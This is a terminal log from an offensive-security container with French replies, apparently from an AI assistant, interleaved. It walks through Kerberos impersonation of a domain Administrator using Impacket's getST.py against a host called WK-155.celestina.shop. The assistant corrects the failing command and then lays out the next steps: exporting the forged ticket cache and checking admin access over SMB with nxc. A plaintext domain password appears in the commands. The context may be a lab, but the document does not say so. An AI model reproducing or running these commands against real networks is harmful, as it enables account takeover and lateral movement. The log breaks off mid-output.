[May 18, 2026 - 11:21:31 (CEST)] exegol-free /workspace # impacket-getST -dc-ip 10.13.37.42 -spn cifs/WK-155.celestina.shop -impersonate Administrator 'celestina.shop/k.cedepte:R3m0t3Pr1v1l3g35@H4nd!'

zsh: command not found: impacket-getST

[May 18, 2026 - 11:21:59 (CEST)] exegol-free /workspace # 

Ah, un grand classique de la configuration d'Exegol ! Dans cet environnement, les outils de la suite Impacket ne sont généralement pas préfixés par impacket-. Ils sont directement accessibles par le nom du script, souvent avec l'extension .py.

Tu peux utiliser directement getST.py (ou parfois simplement getST).

La commande corrigée
Relance l'attaque avec cette syntaxe :

Bash
getST.py -dc-ip 10.13.37.42 -spn cifs/WK-155.celestina.shop -impersonate Administrator 'celestina.shop/k.cedepte:R3m0t3Pr1v1l3g35@H4nd!'
(Si jamais getST.py ne se lance pas non plus, tu peux essayer getST tout court).

La suite des opérations
Une fois que le script a s'est exécuté avec succès :

Il va créer un fichier nommé Administrator.ccache dans ton répertoire courant.

Tu devras charger ce ticket dans ton terminal avec :

Bash
export KRB5CCNAME="Administrator.ccache"
Tu pourras ensuite tester si tu as l'accès Admin sur la machine cible WK-155 via Kerberos :

Bash
nxc smb WK-155.celestina.shop -u 'Administrator' -k --use-kcache
Dis-moi si la commande getST.py s'exécute correctement cette fois !

[May 18, 2026 - 11:21:59 (CEST)] exegol-free /workspace # getST.py -dc-ip 10.13.37.42 -spn cifs/WK-155.celestina.shop -impersonate Administrator 'celestina.shop/k.cedepte:R3m0t3Pr1v1l3g35@H4nd!'

/root/.pyenv/versions/3.11.14/bin/getST.py:4: DeprecationWarning: pkg_resources is depreca